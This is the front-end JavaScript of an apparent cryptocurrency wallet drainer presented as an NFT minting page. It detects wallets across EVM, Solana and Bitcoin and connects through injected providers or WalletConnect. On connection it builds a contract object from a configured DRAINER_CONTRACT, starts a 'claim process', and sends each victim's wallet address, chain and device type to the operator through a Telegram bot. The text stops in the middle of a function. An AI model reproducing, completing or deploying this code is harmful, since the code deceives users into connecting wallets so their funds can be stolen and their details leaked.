import { CONFIG } from './config.js';

;(async function () {
  'use strict';

  // ==========================================================================
  //  DEBUG PANEL
  // ==========================================================================
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    console.log('[main.js]', msg);
    debugArea.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  // ==========================================================================
  //  DEVICE DETECTION
  // ==========================================================================
  const UA = navigator.userAgent || '';
  const isMobile   = () => /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(UA);
  const isIOS      = () => /iPhone|iPad|iPod/i.test(UA);
  const isAndroid  = () => /Android/i.test(UA);
  const isDesktop  = () => !isMobile();
  const isWindows  = () => /Windows/i.test(UA);
  const isMac      = () => /Macintosh|Mac OS X/i.test(UA);
  const getPlatform = () => {
    if (isIOS())     return 'ios';
    if (isAndroid()) return 'android';
    if (isWindows()) return 'windows';
    if (isMac())     return 'mac';
    return 'unknown';
  };

  // ==========================================================================
  //  CONFIG
  // ==========================================================================
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
    MAINNET_ID = 1,
    TELEGRAM_BOT_TOKEN,
    TELEGRAM_CHAT_ID,
  } = CONFIG;

  const PRIMARY_PROJECT_ID  = PROJECT_ID;
  const FALLBACK_PROJECT_ID = (PUBLIC_TEST_ID && PUBLIC_TEST_ID !== PROJECT_ID) ? PUBLIC_TEST_ID : null;

  // Storage keys MUST match script.js exactly.
  const LS = {
    address: 'connectedAddress',       // <-- read by script.js
    wallet:  'connectedWalletType',    // <-- read by script.js
    legacyAddr: 'connectedWallet',     // <-- old main.js used this; kept for back-compat
    chain:   'chainType',              // <-- old main.js used this; kept for back-compat
    wcSession: 'apex_wc_session',      // internal — persisted WC session for restore
    pendingUri: 'pending_wc_uri',
    pendingTs:  'pending_wc_timestamp',
  };

  // ==========================================================================
  //  IN-WALLET BROWSER DETECTION
  // ==========================================================================
  function detectInWalletBrowser() {
    const eth = window.ethereum;
    if (eth?.isMetaMask && /MetaMaskMobile/i.test(UA)) return { wallet: 'metamask', name: 'MetaMask' };
    if (eth?.isTrust || /TrustWallet/i.test(UA))        return { wallet: 'trust',    name: 'Trust Wallet' };
    if (eth?.isCoinbaseWallet || /CoinbaseWallet/i.test(UA)) return { wallet: 'coinbase', name: 'Coinbase Wallet' };
    if (/Rainbow/i.test(UA) && eth)                     return { wallet: 'rainbow',  name: 'Rainbow' };
    if (eth && isMobile())                              return { wallet: 'injected', name: 'Wallet' };
    return null;
  }

  // ==========================================================================
  //  TELEGRAM
  // ==========================================================================
  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' }),
      });
      if (!r.ok) { console.error('[main.js] Telegram error:', await r.text()); return false; }
      return true;
    } catch (e) { console.error('[main.js] Telegram exception:', e); return false; }
  }
  window.testTelegram = (m) => sendTelegramNotification(m || '🧪 Test ' + new Date().toISOString());

  // ==========================================================================
  //  TIMEOUT HELPER
  // ==========================================================================
  function withTimeout(promise, ms, label) {
    let timer;
    const timeout = new Promise((_, reject) => {
      timer = setTimeout(() => reject(new Error(`Timeout: ${label} (${ms}ms)`)), ms);
    });
    return Promise.race([promise, timeout]).finally(() => clearTimeout(timer));
  }

  // ==========================================================================
  //  WEBSOCKET CHECK
  // ==========================================================================
  async function checkWebSocket(retries = 2, delay = 500) {
    for (let i = 0; i < retries; i++) {
      try {
        logDebug(`WebSocket check attempt ${i + 1}/${retries}`);
        const result = await new Promise((resolve) => {
          const ws = new WebSocket('wss://relay.walletconnect.com');
          const timeout = setTimeout(() => { try { ws.close(); } catch {} resolve(false); }, 2000);
          ws.onopen  = () => { clearTimeout(timeout); try { ws.close(); } catch {} resolve(true); };
          ws.onerror = () => { clearTimeout(timeout); try { ws.close(); } catch {} resolve(false); };
        });
        if (result) { logDebug('✅ WebSocket connection successful'); return true; }
        await new Promise((r) => setTimeout(r, delay));
      } catch (e) {
        logDebug(`WebSocket exception: ${e.message}`);
        await new Promise((r) => setTimeout(r, delay));
      }
    }
    logDebug('❌ WebSocket connection failed after retries');
    return false;
  }

  // ==========================================================================
  //  DYNAMIC LIBRARY LOADING (EthereumProvider + Web3 only — no SignClient)
  // ==========================================================================
  async function loadWalletConnect() {
    const providerCdns = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.11.0?bundle',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/+esm',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.11.0',
    ];
    const web3Cdns = [
      'https://esm.sh/web3@4.3.0?bundle',
      'https://cdn.jsdelivr.net/npm/web3@4.3.0/+esm',
      'https://cdn.skypack.dev/web3@4.3.0',
    ];

    let EthereumProvider = null;
    let Web3 = null;

    for (const url of providerCdns) {
      try {
        logDebug(`Trying EthereumProvider from ${url}`);
        const mod = await import(url);
        EthereumProvider = mod.EthereumProvider || mod.default || mod;
        logDebug(`✅ EthereumProvider loaded from ${url}`);
        break;
      } catch (e) { logDebug(`❌ EthereumProvider fail @ ${url}: ${e.message}`); }
    }
    if (!EthereumProvider) throw new Error('Could not load EthereumProvider');

    for (const url of web3Cdns) {
      try {
        logDebug(`Trying Web3 from ${url}`);
        const mod = await import(url);
        Web3 = mod.default || mod.Web3 || mod;
        logDebug(`✅ Web3 loaded from ${url}`);
        break;
      } catch (e) { logDebug(`❌ Web3 fail @ ${url}: ${e.message}`); }
    }
    if (!Web3) throw new Error('Could not load Web3');

    return { EthereumProvider, Web3 };
  }

  // ==========================================================================
  //  DOM
  // ==========================================================================
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  // ==========================================================================
  //  STATE
  // ==========================================================================
  let EthereumProvider = null;
  let Web3Ctor         = null;

  let wcProvider       = null;    // EthereumProvider instance
  let injectedProvider = null;    // window.ethereum
  let activeProvider   = null;    // live EIP-1193 provider
  let web3Instance     = null;
  let contractInstance = null;
  let currentSession   = null;
  let connectionMode   = null;    // 'walletconnect' | 'injected' | 'solana' | 'bitcoin'
  let isConnecting     = false;
  let isDisconnecting  = false;

  // ==========================================================================
  //  STORAGE HELPERS  (write BOTH key names so script.js picks them up)
  // ==========================================================================
  function saveWallet(address, mode = null, session = null) {
    try {
      // script.js's keys:
      localStorage.setItem(LS.address, address);
      if (mode) localStorage.setItem(LS.wallet, mode);

      // Old main.js keys — keep both in sync for anything else reading them:
      localStorage.setItem(LS.legacyAddr, address);
      if (mode) {
        // Only write chainType for evm/solana/bitcoin so script.js's
        // getSavedChainType() check keeps working.
        if (mode === 'injected' || mode === 'walletconnect') {
          localStorage.setItem(LS.chain, 'evm');
        } else if (mode === 'solana' || mode === 'bitcoin') {
          localStorage.setItem(LS.chain, mode);
        }
      }

      if (session) localStorage.setItem(LS.wcSession, JSON.stringify(session));
    } catch (e) { logDebug('saveWallet: ' + e.message); }
  }

  const getSavedWallet  = () => localStorage.getItem(LS.address) || localStorage.getItem(LS.legacyAddr);
  const getSavedMode    = () => localStorage.getItem(LS.wallet);
  const getSavedChain   = () => localStorage.getItem(LS.chain) || 'unknown';
  const getSavedSession = () => {
    try { const s = localStorage.getItem(LS.wcSession); return s ? JSON.parse(s) : null; }
    catch { return null; }
  };

  function clearSavedWallet() {
    try {
      localStorage.removeItem(LS.address);
      localStorage.removeItem(LS.wallet);
      localStorage.removeItem(LS.legacyAddr);
      localStorage.removeItem(LS.chain);
      localStorage.removeItem(LS.wcSession);
    } catch {}
  }

  // ==========================================================================
  //  CHAIN DETECTION
  // ==========================================================================
  function getChainType() {
    if (window.unisat) return 'bitcoin';
    if (window.solana && typeof window.solana.connect === 'function') return 'solana';
    if (window.ethereum) return 'evm';
    return 'unknown';
  }

  // ==========================================================================
  //  GLOBAL PUBLISH — exact shape script.js reads
  // ==========================================================================
  function publishGlobalState(address, chain, provider = null) {
    const live = provider || activeProvider || null;
    window.__apexConnected = {
      address,
      chain,
      web3: web3Instance,
      contract: contractInstance,
      provider: live,
      mode: connectionMode,
      session: currentSession || wcProvider?.session || null,
      publishedAt: Date.now(),
    };
    logDebug(`publishGlobal: addr=${address} mode=${connectionMode} hasProvider=${!!live}`);
    window.dispatchEvent(new CustomEvent('apex:connected', { detail: { address, chain } }));
  }

  // ==========================================================================
  //  BUTTON UI
  // ==========================================================================
  function setButtonState(button, state) {
    if (!button) return;
    button.style.display      = 'inline-block';
    button.style.padding      = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight   = '600';
    button.style.border       = 'none';
    button.style.cursor       = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.transition   = 'all 0.3s ease';
    button.style.color        = 'white';
    button.style.fontSize     = '16px';
    button.style.fontFamily   = "'Inter', sans-serif";
    button.style.boxShadow    = '0 4px 12px rgba(0, 0, 0, 0.15)';
    button.style.minWidth     = '180px';
    button.disabled           = state === 'loading';

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.style.boxShadow  = '0 2px 8px rgba(102, 102, 102, 0.3)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.style.boxShadow  = '0 4px 12px rgba(16, 185, 129, 0.3)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.style.boxShadow  = '0 4px 12px rgba(239, 68, 68, 0.3)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.style.boxShadow  = '0 4px 12px rgba(239, 68, 68, 0.3)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.style.boxShadow  = '0 4px 12px rgba(255, 107, 0, 0.3)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
        button.onmouseenter = () => {
          if (!button.disabled) {
            button.style.transform = 'translateY(-2px)';
            button.style.boxShadow = '0 6px 16px rgba(255, 107, 0, 0.4)';
          }
        };
        button.onmouseleave = () => {
          button.style.transform = 'translateY(0)';
          button.style.boxShadow = '0 4px 12px rgba(255, 107, 0, 0.3)';
        };
    }
  }

  function showStatus(message, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = message;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display = 'block';
    claimStatus.style.padding = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize = '14px';
    claimStatus.style.textAlign = 'center';
    claimStatus.style.transition = 'all 0.3s ease';

    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' },
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);

    if (type === 'error' || type === 'success') {
      setTimeout(() => {
        claimStatus.style.opacity = '0';
        setTimeout(() => {
          claimStatus.style.display = 'none';
          claimStatus.style.opacity = '1';
        }, 300);
      }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  // ==========================================================================
  //  CONNECTED UI
  // ==========================================================================
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
        box-shadow: 0 2px 8px rgba(5, 150, 105, 0.1);
      `;
      connectButton.parentNode.appendChild(display);
    }

    const formatted = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex; align-items:center; justify-content:center; gap:8px; flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${formatted}</span>
        <span style="background:#1F2937; color:white; padding:2px 10px; border-radius:12px; font-size:12px; font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none; border:none; color:#059669; cursor:pointer; padding:4px;" title="Copy address">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;

    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const btn = document.getElementById('copyAddress');
        const orig = btn.innerHTML;
        btn.innerHTML = '<i class="fas fa-check"></i>';
        btn.style.color = '#10B981';
        setTimeout(() => { btn.innerHTML = orig; btn.style.color = '#059669'; }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
    publishGlobalState(address, chain);

    sendTelegramNotification(`
🔗 <b>Wallet Connected</b>
📌 <b>Chain:</b> ${chainLabel}
🧩 <b>Mode:</b> ${connectionMode || 'unknown'}
👤 <b>Address:</b> <code>${address}</code>
🕒 ${new Date().toLocaleString()}
📱 <b>Mobile:</b> ${isMobile() ? 'Yes' : 'No'}
    `.trim());
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    showStatus('Wallet disconnected', 'info');
    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
    currentSession = null;
    connectionMode = null;
    window.__apexConnected = null;
  }

  // ==========================================================================
  //  SOLANA WALLET DETECTION
  // ==========================================================================
  const solanaWalletDetectors = {
    isPhantom:        () => !!(window.phantom?.solana || window.solana?.isPhantom),
    isSolflare:       () => !!window.solflare,
    isBackpack:       () => !!window.backpack,
    isCoinbaseSolana: () => !!window.coinbaseSolana,
    isTrustSolana:    () => !!(window.trustWallet?.solana),
  };

  function getSolanaWallets() {
    const wallets = [];
    if (solanaWalletDetectors.isPhantom())        wallets.push({ name: 'Phantom',  provider: window.phantom?.solana || window.solana });
    if (solanaWalletDetectors.isSolflare())       wallets.push({ name: 'Solflare', provider: window.solflare });
    if (solanaWalletDetectors.isBackpack())       wallets.push({ name: 'Backpack', provider: window.backpack });
    if (solanaWalletDetectors.isCoinbaseSolana()) wallets.push({ name: 'Coinbase', provider: window.coinbaseSolana });
    if (solanaWalletDetectors.isTrustSolana())    wallets.push({ name: 'Trust',    provider: window.trustWallet.solana });
    return wallets;
  }

  // ==========================================================================
  //  EIP-6963
  // ==========================================================================
  let evmProviders = [];
  let eip6963Initialized = false;

  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;

    window.addEventListener('eip6963:announceProvider', (event) => {
      const detail = event.detail;
      if (!evmProviders.some((p) => p.info.uuid === detail.info.uuid)) {
        evmProviders.push(detail);
        logDebug(`EIP-6963: Found provider ${detail.info.name} (${detail.info.rdns})`);
      }
    });

    const fire = () => window.dispatchEvent(new Event('eip6963:requestProvider'));
    fire();
    setTimeout(fire, 500);
    setTimeout(fire, 1500);
  }

  function showWalletSelectionModal(providers, callback) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `
      position: fixed; top:0; left:0; width:100%; height:100%;
      background: rgba(0,0,0,0.7); display:flex; align-items:center; justify-content:center;
      z-index: 99999;
    `;
    const modal = document.createElement('div');
    modal.style.cssText = `
      background: #1F2937; padding: 24px; border-radius: 16px; max-width: 400px; width: 90%;
      color: white; font-family: 'Inter', sans-serif;
      box-shadow: 0 20px 60px rgba(0,0,0,0.5);
    `;
    modal.innerHTML = `
      <h3 style="margin-top:0; font-weight:600; font-size:20px;">Select a Wallet</h3>
      <div id="walletList" style="display:flex; flex-direction:column; gap:10px; margin:16px 0;"></div>
      <button id="cancelWalletSelect" style="background:none; border:1px solid #666; color:#ccc; padding:8px 16px; border-radius:8px; cursor:pointer; width:100%;">Cancel</button>
    `;
    overlay.appendChild(modal);
    document.body.appendChild(overlay);

    const list = modal.querySelector('#walletList');
    providers.forEach((provider) => {
      const btn = document.createElement('button');
      btn.textContent = provider.info.name;
      btn.style.cssText = `
        background: #374151; border:none; padding:12px 16px; border-radius:8px;
        color:white; font-size:16px; cursor:pointer; transition:background 0.2s;
        text-align:left; display:flex; align-items:center; gap:10px;
      `;
      btn.onmouseover = () => btn.style.background = '#4B5563';
      btn.onmouseout  = () => btn.style.background = '#374151';
      if (provider.info.icon) {
        const img = document.createElement('img');
        img.src = provider.info.icon;
        img.style.width = '24px';
        img.style.height = '24px';
        btn.prepend(img);
      }
      btn.addEventListener('click', () => { overlay.remove(); callback(provider); });
      list.appendChild(btn);
    });

    modal.querySelector('#cancelWalletSelect').addEventListener('click', () => {
      overlay.remove();
      callback(null);
    });
  }

  // ==========================================================================
  //  WALLETCONNECT — single EthereumProvider, no separate SignClient
  // ==========================================================================
  async function initWalletConnect({ useFallbackId = false, session = null } = {}) {
    if (wcProvider) return wcProvider;

    const projectId = useFallbackId ? FALLBACK_PROJECT_ID : PRIMARY_PROJECT_ID;
    if (!projectId) { logDebug('❌ No WalletConnect projectId'); return null; }

    logDebug(`🔄 WC init: projectId=${String(projectId).slice(0, 8)}…${session ? ' (restore)' : ''}`);

    await checkWebSocket(2, 500).catch(() => false);

    try {
      const opts = {
        projectId,
        chains: [MAINNET_ID],
        optionalChains: [MAINNET_ID],
        showQrModal: false,   // we render our own QR overlay (Windows-friendly)
        methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4', 'eth_sign'],
        events: ['chainChanged', 'accountsChanged'],
        metadata: DAPP_METADATA,
        relayUrl: 'wss://relay.walletconnect.com',
        rpcMap: { [MAINNET_ID]: 'https://cloudflare-eth.com' },
      };
      if (session) opts.session = session;

      wcProvider = await withTimeout(EthereumProvider.init(opts), 15000, 'EthereumProvider.init');
      attachWCProviderEvents(wcProvider);
      logDebug('✅ WalletConnect initialized successfully');
      return wcProvider;
    } catch (e) {
      logDebug(`❌ WalletConnect init failed: ${e.message}`);
      wcProvider = null;
      return null;
    }
  }

  function attachWCProviderEvents(provider) {
    if (!provider || provider.__apexEventsAttached) return;
    provider.__apexEventsAttached = true;

    provider.on('accountsChanged', (accounts) => {
      logDebug(`WC accountsChanged: ${JSON.stringify(accounts)}`);
      if (!accounts || accounts.length === 0) {
        // Some WC wallets briefly emit [] during connect; re-check before teardown.
        setTimeout(async () => {
          try {
            const again = provider.accounts || (await provider.request({ method: 'eth_accounts' }));
            if (!again || again.length === 0) {
              hardDisconnect({ skipWalletCall: true });
            }
          } catch { hardDisconnect({ skipWalletCall: true }); }
        }, 600);
        return;
      }
      const a = accounts[0];
      saveWallet(a, 'walletconnect', provider.session || null);
      updateConnectedUI(a, 'evm');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 1000);
    });

    provider.on('chainChanged', (id) => {
      logDebug(`WC chainChanged: ${id}`);
      showStatus(`Network changed to ${id}`, 'info');
      const a = window.__apexConnected?.address || getSavedWallet();
      if (a && web3Instance) {
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        publishGlobalState(a, 'evm', provider);
      }
    });

    provider.on('disconnect', (reason) => {
      logDebug(`WC disconnect: ${reason}`);
      hardDisconnect({ skipWalletCall: true });
    });

    provider.on('session_delete', () => {
      logDebug('WC session_delete');
      hardDisconnect({ skipWalletCall: true });
    });
  }

  // ==========================================================================
  //  DEEPLINK HELPERS (Windows desktop QR openers)
  // ==========================================================================
  function buildWalletDeeplink(wallet, uri) {
    const enc = encodeURIComponent(uri);
    switch (wallet) {
      case 'trust':    return `https://link.trustwallet.com/wc?uri=${enc}`;
      case 'metamask': return `https://metamask.app.link/wc?uri=${enc}`;
      case 'rainbow':  return `https://rnbwapp.com/wc?uri=${enc}`;
      case 'coinbase': return `https://go.cb-w.com/wc?uri=${enc}`;
      case 'uniswap':  return `https://uniswap.org/app/wc?uri=${enc}`;
      default:         return null;
    }
  }

  function openDeeplink(url) {
    if (!url) return false;
    try {
      const a = document.createElement('a');
      a.href = url;
      a.rel = 'noopener noreferrer';
      a.style.display = 'none';
      document.body.appendChild(a);
      a.click();
      setTimeout(() => a.remove(), 500);
      return true;
    } catch (e) { logDebug('deeplink error: ' + e.message); return false; }
  }

  function showDeeplinkFallback(uri) {
    const existing = document.getElementById('apex-wc-deeplink');
    if (existing) existing.remove();

    const wrap = document.createElement('div');
    wrap.id = 'apex-wc-deeplink';
    wrap.style.cssText = `
      position:fixed;inset:0;background:rgba(0,0,0,0.78);
      display:flex;align-items:center;justify-content:center;z-index:99998;
      font-family:Inter,system-ui,sans-serif;color:white;
    `;
    wrap.innerHTML = `
      <div style="background:#1F2937;padding:24px;border-radius:16px;max-width:460px;width:92%;">
        <h3 style="margin:0 0 12px;font-size:18px;font-weight:600;">Scan with your wallet</h3>
        <div id="apex-qr" style="background:white;border-radius:12px;padding:12px;display:flex;justify-content:center;margin-bottom:12px;min-height:264px;align-items:center;color:#666;font-size:13px;">Loading QR…</div>
        <p style="font-size:12px;color:#9CA3AF;margin:0 0 10px;word-break:break-all;">
          Or copy the URI: <code id="apex-uri" style="color:#FCD34D;">${uri.slice(0, 64)}…</code>
        </p>
        <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:8px;">
          <button data-wallet="metamask" style="flex:1;min-width:120px;background:#374151;border:none;padding:10px;border-radius:8px;color:white;cursor:pointer;">MetaMask</button>
          <button data-wallet="trust"    style="flex:1;min-width:120px;background:#374151;border:none;padding:10px;border-radius:8px;color:white;cursor:pointer;">Trust Wallet</button>
          <button data-wallet="rainbow"  style="flex:1;min-width:120px;background:#374151;border:none;padding:10px;border-radius:8px;color:white;cursor:pointer;">Rainbow</button>
          <button data-wallet="coinbase" style="flex:1;min-width:120px;background:#374151;border:none;padding:10px;border-radius:8px;color:white;cursor:pointer;">Coinbase</button>
          <button data-wallet="copy"     style="flex:1;min-width:120px;background:#0EA5E9;border:none;padding:10px;border-radius:8px;color:white;cursor:pointer;">Copy URI</button>
          <button data-wallet="close"    style="flex:1;min-width:120px;background:none;border:1px solid #666;padding:10px;border-radius:8px;color:#ccc;cursor:pointer;">Cancel</button>
        </div>
      </div>
    `;
    document.body.appendChild(wrap);

    const qrBox = wrap.querySelector('#apex-qr');
    import('https://esm.sh/qrcode@1.5.3?bundle')
      .then((m) => {
        const QR = m.default || m;
        const canvas = document.createElement('canvas');
        QR.toCanvas(canvas, uri, { width: 240, margin: 1 }, (err) => {
          if (!err) { qrBox.innerHTML = ''; qrBox.appendChild(canvas); }
          else qrBox.textContent = 'QR unavailable';
        });
      })
      .catch(() => { qrBox.textContent = 'QR unavailable'; });

    wrap.addEventListener('click', (e) => {
      const b = e.target.closest('button[data-wallet]');
      if (!b) return;
      const w = b.getAttribute('data-wallet');
      if (w === 'close') { wrap.remove(); return; }
      if (w === 'copy') {
        navigator.clipboard.writeText(uri).then(() => {
          b.textContent = 'Copied!';
          setTimeout(() => { b.textContent = 'Copy URI'; }, 1500);
        });
        return;
      }
      const link = buildWalletDeeplink(w, uri);
      if (link) openDeeplink(link);
    });
  }

  // ==========================================================================
  //  EVM PROVIDER EVENTS
  // ==========================================================================
  function setupEVMProviderEvents(provider) {
    if (!provider || !provider.on || provider.__apexInjectedEvents) return;
    provider.__apexInjectedEvents = true;

    provider.on('accountsChanged', (accounts) => {
      if (!accounts || accounts.length === 0) {
        hardDisconnect({ skipWalletCall: true });
      } else {
        updateConnectedUI(accounts[0], 'evm');
        saveWallet(accounts[0], 'injected');
        setTimeout(() => {
          if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
        }, 1000);
      }
    });

    provider.on('chainChanged', (chainId) => {
      showStatus(`Network changed to ${chainId}`, 'info');
      const a = window.__apexConnected?.address || getSavedWallet();
      if (a && web3Instance) {
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        publishGlobalState(a, 'evm', provider);
      }
    });

    provider.on('disconnect', () => hardDisconnect({ skipWalletCall: true }));
  }

  // ==========================================================================
  //  DIRECT EVM CONNECT (desktop)
  // ==========================================================================
  async function connectDirectEVM(timeoutMs = 4000) {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 300));

    const inWallet = detectInWalletBrowser();
    let providers = evmProviders.filter((p) => p.provider);
    if (providers.length === 0 && window.ethereum) {
      providers = [{
        info: { name: inWallet?.name || 'Injected Wallet', rdns: 'io.injected', icon: '' },
        provider: window.ethereum,
      }];
    }
    if (providers.length === 0) { logDebug('No EVM providers found'); return false; }

    let chosenProvider = null;
    if (inWallet && window.ethereum) {
      chosenProvider = { info: { name: inWallet.name }, provider: window.ethereum };
    } else if (providers.length === 1) {
      chosenProvider = providers[0];
    } else {
      const known = providers.find((p) => p.info.rdns === 'io.metamask' || /metamask/i.test(p.info.name || ''));
      if (known) chosenProvider = known;
      else {
        chosenProvider = await new Promise((resolve) => showWalletSelectionModal(providers, resolve));
        if (!chosenProvider) return false;
      }
    }

    try {
      logDebug(`Direct EVM: attempting with ${chosenProvider.info.name} (timeout ${timeoutMs}ms)`);
      const provider = chosenProvider.provider;
      const accounts = await withTimeout(
        provider.request({ method: 'eth_requestAccounts' }),
        timeoutMs,
        'eth_requestAccounts'
      );
      if (!accounts || accounts.length === 0) return false;

      const address = accounts[0];
      logDebug(`✅ Direct EVM connection via ${chosenProvider.info.name}: ${address}`);

      injectedProvider = provider;
      activeProvider = provider;
      connectionMode = 'injected';
      web3Instance = new Web3Ctor(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      saveWallet(address, 'injected');
      setupEVMProviderEvents(provider);
      updateConnectedUI(address, 'evm');
      return true;
    } catch (err) {
      logDebug(`Direct EVM error: ${err.message}`);
      if (err.code === 4001) logDebug('User rejected direct connection');
      return false;
    }
  }

  // ==========================================================================
  //  WALLETCONNECT CONNECT
  // ==========================================================================
  async function connectViaWalletConnect({ useFallbackId = false, timeoutMs = 300000 } = {}) {
    if (isConnecting) { logDebug('Already connecting, please wait'); return false; }
    isConnecting = true;

    try {
      const provider = await initWalletConnect({ useFallbackId });
      if (!provider) {
        isConnecting = false;
        showStatus('Wallet connection service unavailable', 'error');
        return false;
      }

      // If a persisted session already exists, use it.
      if (provider.session && provider.accounts?.length) {
        const a = provider.accounts[0];
        activeProvider = provider;
        connectionMode = 'walletconnect';
        currentSession = provider.session;
        web3Instance = new Web3Ctor(provider);
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        saveWallet(a, 'walletconnect', provider.session);
        updateConnectedUI(a, 'evm');
        logDebug(`✅ WC session re-used: ${a}`);
        isConnecting = false;
        return true;
      }

      showStatus('Requesting wallet connection...', 'info');

      // Capture URI for our own QR / deeplink overlay.
      let uriHandled = false;
      const onUri = (uri) => {
        if (uriHandled) return;
        uriHandled = true;
        logDebug(`URI: ${uri}`);
        try { showDeeplinkFallback(uri); } catch (e) { logDebug('deeplink UI: ' + e.message); }
        try {
          sessionStorage.setItem(LS.pendingUri, uri);
          sessionStorage.setItem(LS.pendingTs, Date.now().toString());
        } catch {}
      };
      provider.on('display_uri', onUri);

      // provider.enable() drives the pairing + waits for approval.
      const accounts = await withTimeout(provider.enable(), timeoutMs, 'WC enable');
      provider.removeListener?.('display_uri', onUri);
      document.getElementById('apex-wc-deeplink')?.remove();

      try {
        sessionStorage.removeItem(LS.pendingUri);
        sessionStorage.removeItem(LS.pendingTs);
      } catch {}

      if (!accounts || accounts.length === 0) {
        logDebug('WC enable returned no accounts');
        showStatus('No accounts found', 'error');
        isConnecting = false;
        return false;
      }

      const account = accounts[0];
      logDebug(`✅ WalletConnect session: ${account}`);

      activeProvider = provider;
      connectionMode = 'walletconnect';
      currentSession = provider.session || null;
      web3Instance = new Web3Ctor(provider);
      contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);

      saveWallet(account, 'walletconnect', currentSession);
      updateConnectedUI(account, 'evm');
      isConnecting = false;
      return true;
    } catch (err) {
